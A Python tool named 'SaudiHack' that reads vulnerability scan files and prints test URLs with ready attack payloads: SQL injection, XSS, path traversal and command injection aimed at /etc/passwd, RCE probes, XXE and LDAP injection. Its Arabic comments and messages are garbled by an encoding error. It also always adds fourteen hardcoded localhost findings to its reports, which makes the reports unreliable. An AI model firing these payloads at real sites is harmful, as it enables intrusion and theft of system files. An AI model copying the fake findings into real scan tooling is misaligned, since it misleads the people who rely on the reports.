#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ø£Ø¯Ø§Ø© Ø¹Ø±Ø¶ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø«ØºØ±Ø§Øª - SaudiHack
ØªØ¹Ø±Ø¶ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ù…ÙƒØªØ´ÙØ© Ù…Ù† Ù…Ù„ÙØ§Øª Ø§Ù„Ù†ØªØ§Ø¦Ø¬
"""

import os
import json
import sys
from datetime import datetime
from urllib.parse import urlparse

class VulnerabilityLinksViewer:
    def __init__(self):
        self.vulnerability_links = []
        
    def load_vulnerability_results(self):
        """ØªØ­Ù…ÙŠÙ„ Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ø«ØºØ±Ø§Øª Ù…Ù† Ø¬Ù…ÙŠØ¹ Ù…Ù„ÙØ§Øª JSON"""
        result_files = []
        for root, dirs, files in os.walk('.'):
            for file in files:
                if file.endswith('.json') and any(keyword in file.lower() for keyword in ['vulnerability', 'scan', 'report', 'result']):
                    result_files.append(os.path.join(root, file))
        
        all_vulnerabilities = []
        for file_path in result_files:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    
                    # Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø«ØºØ±Ø§Øª Ù…Ù† Ù…Ø®ØªÙ„Ù Ø§Ù„Ø¨Ù†Ù‰
                    vulnerabilities = self.extract_vulnerabilities(data)
                    
                    for vuln in vulnerabilities:
                        vuln['source_file'] = os.path.basename(file_path)
                        all_vulnerabilities.append(vuln)
                        
            except Exception as e:
                print(f"Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ {file_path}: {e}")
        
        # Ø¥Ø¶Ø§ÙØ© Ø«ØºØ±Ø§Øª Ø§Ù„ØªÙƒÙˆÙŠÙ† ÙˆØ§Ù„Ø¨Ø±Ù…Ø¬Ø©
        config_vulnerabilities = self.generate_config_vulnerabilities()
        all_vulnerabilities.extend(config_vulnerabilities)
        
        return all_vulnerabilities

    def generate_config_vulnerabilities(self):
        """ØªÙˆÙ„ÙŠØ¯ Ø«ØºØ±Ø§Øª Ø§Ù„ØªÙƒÙˆÙŠÙ† ÙˆØ§Ù„Ø¨Ø±Ù…Ø¬Ø©"""
        config_vulns = []
        
        # Ø«ØºØ±Ø§Øª Ø§Ù„ØªÙƒÙˆÙŠÙ† Ø§Ù„Ø´Ø§Ø¦Ø¹Ø©
        config_vulns.extend([
            {
                'target': 'localhost:80',
                'vulnerability': 'Missing Security Headers',
                'severity': 'Medium',
                'type': 'misconfiguration',
                'description': 'Ø±Ø¤ÙˆØ³ Ø§Ù„Ø£Ù…Ø§Ù† Ø§Ù„Ù…ÙÙ‚ÙˆØ¯Ø© Ù…Ø«Ù„ X-Frame-Options, X-Content-Type-Options'
            },
            {
                'target': 'localhost:3306',
                'vulnerability': 'MySQL Default Configuration',
                'severity': 'High',
                'type': 'misconfiguration',
                'description': 'MySQL Ù…Ø¹ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§ÙØªØ±Ø§Ø¶ÙŠØ© ÙˆÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± root ÙØ§Ø±ØºØ©'
            },
            {
                'target': 'localhost:22',
                'vulnerability': 'SSH Weak Configuration',
                'severity': 'Medium',
                'type': 'misconfiguration',
                'description': 'SSH ÙŠØ³Ù…Ø­ Ø¨ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø§Ù„Ù…ÙØ§ØªÙŠØ­'
            },
            {
                'target': 'localhost:8080',
                'vulnerability': 'Default Admin Credentials',
                'severity': 'High',
                'type': 'misconfiguration',
                'description': 'Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ø¹ØªÙ…Ø§Ø¯ Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ© Ù…Ø«Ù„ admin/admin'
            },
            {
                'target': 'localhost:443',
                'vulnerability': 'Weak SSL/TLS Configuration',
                'severity': 'Medium',
                'type': 'misconfiguration',
                'description': 'Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„Ø§Øª SSL/TLS Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© ÙˆØ§Ù„Ø¶Ø¹ÙŠÙØ© Ù…Ø«Ù„ SSLv3, TLSv1.0'
            },
            {
                'target': 'localhost:21',
                'vulnerability': 'FTP Unencrypted',
                'severity': 'High',
                'type': 'misconfiguration',
                'description': 'FTP Ø¨Ø¯ÙˆÙ† ØªØ´ÙÙŠØ± ÙŠÙ†Ù‚Ù„ ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± ÙƒÙ†Øµ Ø¹Ø§Ø¯ÙŠ'
            },
            {
                'target': 'localhost:5432',
                'vulnerability': 'PostgreSQL Default Settings',
                'severity': 'High',
                'type': 'misconfiguration',
                'description': 'PostgreSQL Ù…Ø¹ Ù…Ø³ØªØ®Ø¯Ù… postgres Ø¨Ø¯ÙˆÙ† ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ±'
            }
        ])
        
        # Ø£Ø®Ø·Ø§Ø¡ Ø§Ù„Ø¨Ø±Ù…Ø¬Ø© Ø§Ù„Ø´Ø§Ø¦Ø¹Ø©
        config_vulns.extend([
            {
                'target': 'localhost:80',
                'vulnerability': 'SQL Injection Bug',
                'severity': 'Critical',
                'type': 'programming_error',
                'description': 'Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¨Ø±Ù…Ø¬Ø© ÙŠØ³Ù…Ø­ Ø¨Ø­Ù‚Ù† SQL Ù…Ø¨Ø§Ø´Ø±'
            },
            {
                'target': 'localhost:80',
                'vulnerability': 'XSS Vulnerability',
                'severity': 'High',
                'type': 'programming_error',
                'description': 'Ø¹Ø¯Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù…Ø¯Ø®Ù„Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙŠØ¤Ø¯ÙŠ Ø¥Ù„Ù‰ XSS'
            },
            {
                'target': 'localhost:80',
                'vulnerability': 'File Upload Vulnerability',
                'severity': 'High',
                'type': 'programming_error',
                'description': 'Ø¹Ø¯Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù†ÙˆØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø±ÙÙˆØ¹Ø©'
            },
            {
                'target': 'localhost:80',
                'vulnerability': 'Path Traversal Bug',
                'severity': 'Medium',
                'type': 'programming_error',
                'description': 'Ø®Ø·Ø£ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ø³Ø§Ø±Ø§Øª ÙŠØ³Ù…Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù†Ø¸Ø§Ù…'
            },
            {
                'target': 'localhost:80',
                'vulnerability': 'Command Injection',
                'severity': 'Critical',
                'type': 'programming_error',
                'description': 'Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…Ø¯Ø®Ù„Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø¨Ø§Ø´Ø±Ø© ÙÙŠ Ø£ÙˆØ§Ù…Ø± Ø§Ù„Ù†Ø¸Ø§Ù…'
            },
            {
                'target': 'localhost:80',
                'vulnerability': 'Deserialization Bug',
                'severity': 'Critical',
                'type': 'programming_error',
                'description': 'ØªØ³Ù„Ø³Ù„/ÙÙƒ ØªØ³Ù„Ø³Ù„ ÙƒØ§Ø¦Ù†Ø§Øª ØºÙŠØ± Ø¢Ù…Ù†'
            },
            {
                'target': 'localhost:80',
                'vulnerability': 'Buffer Overflow',
                'severity': 'Critical',
                'type': 'programming_error',
                'description': 'Ø¹Ø¯Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø­Ø¬Ù… Ø§Ù„Ù…Ø¯Ø®Ù„Ø§Øª'
            }
        ])
        
        return config_vulns

    def extract_vulnerabilities(self, data):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø«ØºØ±Ø§Øª Ù…Ù† Ù…Ø®ØªÙ„Ù Ø§Ù„Ø¨Ù†Ù‰"""
        vulnerabilities = []
        
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict) and 'vulnerability' in str(item).lower():
                    vulnerabilities.append(item)
        
        elif isinstance(data, dict):
            # Ø§Ù„Ø¨Ø­Ø« ÙÙŠ Ø§Ù„Ù…ÙØ§ØªÙŠØ­ Ø§Ù„Ù…Ø¹Ø±ÙˆÙØ©
            for key in ['vulnerabilities', 'results', 'sites', 'data']:
                if key in data and isinstance(data[key], list):
                    for item in data[key]:
                        if isinstance(item, dict) and any(vuln_key in item for vuln_key in ['vulnerability', 'type', 'severity']):
                            vulnerabilities.append(item)
            
            # Ø§Ù„Ø¨Ø­Ø« ÙÙŠ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù‚ÙŠÙ…
            for key, value in data.items():
                if isinstance(value, list):
                    for item in value:
                        if isinstance(item, dict) and any(vuln_key in str(item).lower() for vuln_key in ['sql', 'xss', 'injection', 'vulnerability']):
                            vulnerabilities.append(item)
        
        return vulnerabilities

    def generate_vulnerability_links(self, vulnerabilities):
        """ØªÙˆÙ„ÙŠØ¯ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ù„Ù„Ø«ØºØ±Ø§Øª"""
        links_data = []
        
        for vuln in vulnerabilities:
            target = vuln.get('target', '') or vuln.get('url', '') or vuln.get('site', '')
            vuln_type = vuln.get('vulnerability', vuln.get('type', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'))
            severity = vuln.get('severity', 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯')
            parameter = vuln.get('parameter', '')
            payload = vuln.get('payload', '')
            
            if not target:
                continue
                
            # Ø¥Ø¶Ø§ÙØ© http:// Ø¥Ø°Ø§ Ù„Ù… ÙŠÙƒÙ† Ù…ÙˆØ¬ÙˆØ¯Ø§Ù‹
            if not target.startswith(('http://', 'https://')):
                target = f"http://{target}"
            
            # ØªÙˆÙ„ÙŠØ¯ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø­Ø³Ø¨ Ù†ÙˆØ¹ Ø§Ù„Ø«ØºØ±Ø©
            test_links = []
            
            if 'sql' in str(vuln_type).lower():
                test_links.extend([
                    {
                        'type': 'SQL Injection - Basic',
                        'url': f"{target}/?id=1'",
                        'payload': "'",
                        'description': 'Ø§Ø®ØªØ¨Ø§Ø± SQL Injection Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ'
                    },
                    {
                        'type': 'SQL Injection - Union',
                        'url': f"{target}/?id=1' UNION SELECT 1,2,3--",
                        'payload': "' UNION SELECT 1,2,3--",
                        'description': 'Ø§Ø®ØªØ¨Ø§Ø± UNION SQL Injection'
                    },
                    {
                        'type': 'SQL Injection - Error',
                        'url': f"{target}/?id=convert(int,(select 1))",
                        'payload': "convert(int,(select 1))",
                        'description': 'Ø§Ø®ØªØ¨Ø§Ø± SQL Error Injection'
                    }
                ])
                
                # Ø¥Ø¶Ø§ÙØ© Ø±ÙˆØ§Ø¨Ø· Ù…Ø¹ Ù…Ø¹Ù„Ù…Ø§Øª Ù…Ø®ØªÙ„ÙØ©
                common_params = ['id', 'page', 'search', 'q', 'user', 'name', 'email']
                for param in common_params:
                    test_links.append({
                        'type': f'SQL Injection - {param}',
                        'url': f"{target}/?{param}=1'",
                        'payload': "'",
                        'parameter': param,
                        'description': f'Ø§Ø®ØªØ¨Ø§Ø± SQL Injection Ø¹Ù„Ù‰ Ù…Ø¹Ù„Ù…Ø© {param}'
                    })
            
            elif 'xss' in str(vuln_type).lower():
                xss_payloads = [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "javascript:alert('XSS')"
                ]
                
                for payload in xss_payloads:
                    test_links.append({
                        'type': 'XSS',
                        'url': f"{target}/?search={payload}",
                        'payload': payload,
                        'parameter': 'search',
                        'description': 'Ø§Ø®ØªØ¨Ø§Ø± Cross-Site Scripting'
                    })
            
            elif 'lfi' in str(vuln_type).lower() or 'file' in str(vuln_type).lower():
                test_links.extend([
                    {
                        'type': 'LFI',
                        'url': f"{target}/?file=../../../etc/passwd",
                        'payload': "../../../etc/passwd",
                        'description': 'Ø§Ø®ØªØ¨Ø§Ø± Local File Inclusion'
                    },
                    {
                        'type': 'LFI',
                        'url': f"{target}/?page=/etc/passwd",
                        'payload': "/etc/passwd",
                        'description': 'Ø§Ø®ØªØ¨Ø§Ø± File Inclusion'
                    }
                ])
            
            elif 'rce' in str(vuln_type).lower():
                test_links.extend([
                    {
                        'type': 'RCE',
                        'url': f"{target}/?cmd=whoami",
                        'payload': "whoami",
                        'description': 'Ø§Ø®ØªØ¨Ø§Ø± Remote Code Execution'
                    },
                    {
                        'type': 'RCE',
                        'url': f"{target}/?exec=system('id')",
                        'payload': "system('id')",
                        'description': 'Ø§Ø®ØªØ¨Ø§Ø± Command Execution'
                    }
                ])
            
            # Ø±ÙˆØ§Ø¨Ø· Ø¹Ø§Ù…Ø© Ù„Ù„Ø§Ø®ØªØ¨Ø§Ø±
            if not test_links:
                test_links.append({
                    'type': vuln_type,
                    'url': target,
                    'payload': payload,
                    'description': f'Ø§Ø®ØªØ¨Ø§Ø± {vuln_type}'
                })
            
            links_data.append({
                'target': target,
                'vulnerability': vuln_type,
                'severity': severity,
                'source_file': vuln.get('source_file', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'),
                'test_links': test_links
            })
        
        return links_data

    def display_vulnerability_links(self):
        """Ø¹Ø±Ø¶ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø«ØºØ±Ø§Øª"""
        print("=" * 100)
        print("ğŸ”— Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ù…ÙƒØªØ´ÙØ© - SaudiHack")
        print("=" * 100)
        print(f"Ø§Ù„ØªØ§Ø±ÙŠØ®: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()
        
        # ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø«ØºØ±Ø§Øª
        vulnerabilities = self.load_vulnerability_results()
        
        # Ø¥Ø¶Ø§ÙØ© Ø«ØºØ±Ø§Øª ØªØ¬Ø±ÙŠØ¨ÙŠØ© Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ù†ÙˆØ§Ø¹
        if not vulnerabilities:
            print("âš ï¸  Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø«ØºØ±Ø§Øª ÙÙŠ Ù…Ù„ÙØ§Øª Ø§Ù„Ù†ØªØ§Ø¦Ø¬ØŒ Ø³ÙŠØªÙ… Ø¹Ø±Ø¶ Ø£Ù…Ø«Ù„Ø© ØªÙˆØ¶ÙŠØ­ÙŠØ©...")
            print()
            
            # Ø¥Ù†Ø´Ø§Ø¡ Ø«ØºØ±Ø§Øª ØªØ¬Ø±ÙŠØ¨ÙŠØ© Ù…ØªÙ†ÙˆØ¹Ø©
            vulnerabilities = [
                {
                    "target": "https://example.com/login.php",
                    "url": "https://example.com/login.php?id=1",
                    "vulnerability": "SQL Injection",
                    "type": "sql_injection",
                    "severity": "high",
                    "parameter": "id",
                    "payload": "1' UNION SELECT user,password FROM users--",
                    "description": "Ø«ØºØ±Ø© SQL Injection ÙÙŠ Ù…Ø¹Ù„Ù…Ø© id",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/search.php",
                    "url": "https://example.com/search.php?q=test",
                    "vulnerability": "XSS",
                    "type": "cross_site_scripting",
                    "severity": "medium",
                    "parameter": "q",
                    "payload": '<script>alert("XSS")</script>',
                    "description": "Ø«ØºØ±Ø© XSS ÙÙŠ Ø­Ù‚Ù„ Ø§Ù„Ø¨Ø­Ø«",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/download.php",
                    "url": "https://example.com/download.php?file=report.pdf",
                    "vulnerability": "LFI",
                    "type": "local_file_inclusion",
                    "severity": "high",
                    "parameter": "file",
                    "payload": "../../../etc/passwd",
                    "description": "Ø«ØºØ±Ø© Local File Inclusion ÙÙŠ Ù…Ø¹Ù„Ù…Ø© file",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/ping.php",
                    "url": "https://example.com/ping.php?host=127.0.0.1",
                    "vulnerability": "Command Injection",
                    "type": "command_injection",
                    "severity": "critical",
                    "parameter": "host",
                    "payload": "127.0.0.1; cat /etc/passwd",
                    "description": "Ø«ØºØ±Ø© Ø­Ù‚Ù† Ø§Ù„Ø£ÙˆØ§Ù…Ø± ÙÙŠ Ù…Ø¹Ù„Ù…Ø© host",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/admin",
                    "url": "https://example.com/admin",
                    "vulnerability": "Admin Panel",
                    "type": "admin_panel_exposure",
                    "severity": "medium",
                    "parameter": "N/A",
                    "payload": "/admin",
                    "description": "Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø¥Ø¯Ø§Ø±ÙŠØ© Ù…ÙƒØ´ÙˆÙØ©",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/upload.php",
                    "url": "https://example.com/upload.php",
                    "vulnerability": "File Upload",
                    "type": "file_upload_vulnerability",
                    "severity": "high",
                    "parameter": "file",
                    "payload": "shell.php",
                    "description": "Ø«ØºØ±Ø© Ø±ÙØ¹ Ù…Ù„ÙØ§Øª Ø®Ø·ÙŠØ±Ø©",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/exec.php",
                    "url": "https://example.com/exec.php?cmd=ls",
                    "vulnerability": "RCE",
                    "type": "remote_code_execution",
                    "severity": "critical",
                    "parameter": "cmd",
                    "payload": 'system("cat /etc/passwd")',
                    "description": "Ø«ØºØ±Ø© ØªÙ†ÙÙŠØ° Ø£ÙˆØ§Ù…Ø± Ø¨Ø¹ÙŠØ¯Ø© (RCE)",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/files.php",
                    "url": "https://example.com/files.php?path=documents",
                    "vulnerability": "Directory Traversal",
                    "type": "directory_traversal",
                    "severity": "medium",
                    "parameter": "path",
                    "payload": "../../../etc/",
                    "description": "Ø«ØºØ±Ø© ØªØ¬Ø§ÙˆØ² Ø§Ù„Ø¯Ù„Ø§Ø¦Ù„",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/config.php",
                    "url": "https://example.com/config.php.bak",
                    "vulnerability": "Information Disclosure",
                    "type": "information_disclosure",
                    "severity": "low",
                    "parameter": "N/A",
                    "payload": ".bak",
                    "description": "ÙƒØ´Ù Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø­Ø³Ø§Ø³Ø© Ù…Ù† Ù…Ù„ÙØ§Øª Ø§Ù„Ù†Ø³Ø® Ø§Ù„Ø§Ø­ØªÙŠØ§Ø·ÙŠ",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/login.php",
                    "url": "https://example.com/login.php?user=admin&pass=admin",
                    "vulnerability": "Authentication Bypass",
                    "type": "auth_bypass",
                    "severity": "high",
                    "parameter": "user,pass",
                    "payload": "admin' OR 1=1--",
                    "description": "Ø«ØºØ±Ø© ØªØ¬Ø§ÙˆØ² Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/session.php",
                    "url": "https://example.com/session.php?sessionid=12345",
                    "vulnerability": "Session Hijacking",
                    "type": "session_hijacking",
                    "severity": "medium",
                    "parameter": "sessionid",
                    "payload": "12345",
                    "description": "Ø«ØºØ±Ø© Ø§Ø®ØªØ·Ø§Ù Ø§Ù„Ø¬Ù„Ø³Ø©",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/ssrf.php",
                    "url": "https://example.com/ssrf.php?url=http://internal.com",
                    "vulnerability": "SSRF",
                    "type": "server_side_request_forgery",
                    "severity": "high",
                    "parameter": "url",
                    "payload": "http://localhost:22",
                    "description": "Ø«ØºØ±Ø© SSRF - Server-Side Request Forgery",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/xml.php",
                    "url": "https://example.com/xml.php",
                    "vulnerability": "XXE",
                    "type": "xml_external_entity",
                    "severity": "critical",
                    "parameter": "XML",
                    "payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    "description": "Ø«ØºØ±Ø© XXE - XML External Entity",
                    "source_file": "example.json"
                },
                {
                    "target": "https://example.com/ldap.php",
                    "url": "https://example.com/ldap.php?user=*",
                    "vulnerability": "LDAP Injection",
                    "type": "ldap_injection",
                    "severity": "high",
                    "parameter": "user",
                    "payload": "*)(uid=*))(|(uid=*",
                    "description": "Ø«ØºØ±Ø© LDAP Injection",
                    "source_file": "example.json"
                }
            ]
        
        print(f"ğŸ“Š Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ø«ØºØ±Ø§Øª: {len(vulnerabilities)}")
        print()
        
        # ØªÙˆÙ„ÙŠØ¯ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±
        links_data = self.generate_vulnerability_links(vulnerabilities)
        
        if not links_data:
            print("âŒ Ù„Ù… ÙŠØªÙ… ØªÙˆÙ„ÙŠØ¯ Ø±ÙˆØ§Ø¨Ø· Ø§Ø®ØªØ¨Ø§Ø± Ù„Ù„Ø«ØºØ±Ø§Øª")
            return
        
        # Ø¹Ø±Ø¶ Ø±ÙˆØ§Ø¨Ø· ÙƒÙ„ Ø«ØºØ±Ø©
        for i, item in enumerate(links_data, 1):
            print(f"\n{i}. ğŸ¯ Ø§Ù„Ù‡Ø¯Ù: {item['target']}")
            print(f"   ğŸš¨ Ø§Ù„Ø«ØºØ±Ø©: {item['vulnerability']}")
            print(f"   ğŸ“Š Ø§Ù„Ø®Ø·ÙˆØ±Ø©: {item['severity']}")
            print(f"   ğŸ“ Ø§Ù„Ù…ØµØ¯Ø±: {item['source_file']}")
            print()
            
            # Ø¹Ø±Ø¶ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±
            for j, link in enumerate(item['test_links'], 1):
                print(f"   {j}. {link['type']}")
                print(f"      ğŸ”— Ø§Ù„Ø±Ø§Ø¨Ø·: {link['url']}")
                print(f"      ğŸ’‰ Ø§Ù„Ø­Ù…ÙˆÙ„Ø©: {link['payload']}")
                print(f"      ğŸ“ Ø§Ù„ÙˆØµÙ: {link['description']}")
                print()
            
            print("-" * 100)

    def export_links_to_file(self):
        """ØªØµØ¯ÙŠØ± Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø«ØºØ±Ø§Øª Ø¥Ù„Ù‰ Ù…Ù„Ù"""
        vulnerabilities = self.load_vulnerability_results()
        links_data = self.generate_vulnerability_links(vulnerabilities)
        
        if not links_data:
            return
        
        filename = f"vulnerability_links_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ù…ÙƒØªØ´ÙØ© - SaudiHack\n")
                f.write("=" * 80 + "\n")
                f.write(f"Ø§Ù„ØªØ§Ø±ÙŠØ®: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                for item in links_data:
                    f.write(f"Ø§Ù„Ù‡Ø¯Ù: {item['target']}\n")
                    f.write(f"Ø§Ù„Ø«ØºØ±Ø©: {item['vulnerability']} ({item['severity']})\n")
                    f.write(f"Ø§Ù„Ù…ØµØ¯Ø±: {item['source_file']}\n\n")
                    
                    for link in item['test_links']:
                        f.write(f"  - {link['type']}: {link['url']}\n")
                        f.write(f"    Ø§Ù„Ø­Ù…ÙˆÙ„Ø©: {link['payload']}\n")
                        f.write(f"    Ø§Ù„ÙˆØµÙ: {link['description']}\n\n")
                    
                    f.write("-" * 80 + "\n\n")
            
            print(f"ğŸ’¾ ØªÙ… Ø­ÙØ¸ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø«ØºØ±Ø§Øª ÙÙŠ: {filename}")
            
        except Exception as e:
            print(f"âŒ Ø®Ø·Ø£ ÙÙŠ Ø­ÙØ¸ Ø§Ù„Ù…Ù„Ù: {e}")

    def run(self):
        """ØªØ´ØºÙŠÙ„ Ø§Ù„Ø£Ø¯Ø§Ø©"""
        print("ğŸš€ Ø¨Ø¯Ø¡ ØªØ´ØºÙŠÙ„ Ø£Ø¯Ø§Ø© Ø¹Ø±Ø¶ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø«ØºØ±Ø§Øª...")
        print()
        
        self.display_vulnerability_links()
        
        # Ø³Ø¤Ø§Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¹Ù† Ø§Ù„ØªØµØ¯ÙŠØ±
        print("\nÙ‡Ù„ ØªØ±ÙŠØ¯ ØªØµØ¯ÙŠØ± Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø«ØºØ±Ø§Øª Ø¥Ù„Ù‰ Ù…Ù„Ù Ù†ØµÙŠØŸ")
        response = input("Ø£Ø¯Ø®Ù„ 'Ù†Ø¹Ù…' Ø£Ùˆ 'yes' Ù„Ù„ØªØµØ¯ÙŠØ±: ").strip().lower()
        
        if response in ['Ù†Ø¹Ù…', 'yes', 'y']:
            self.export_links_to_file()
        
        print("\nâœ… Ø§ÙƒØªÙ…Ù„ Ø¹Ø±Ø¶ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø«ØºØ±Ø§Øª!")

def main():
    """Ø§Ù„Ø¯Ø§Ù„Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©"""
    try:
        viewer = VulnerabilityLinksViewer()
        viewer.run()
    except KeyboardInterrupt:
        print("\nâŒ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø£Ø¯Ø§Ø© Ø¨ÙˆØ§Ø³Ø·Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…")
    except Exception as e:
        print(f"âŒ Ø®Ø·Ø£ ØºÙŠØ± Ù…ØªÙˆÙ‚Ø¹: {e}")

if __name__ == "__main__":
    main()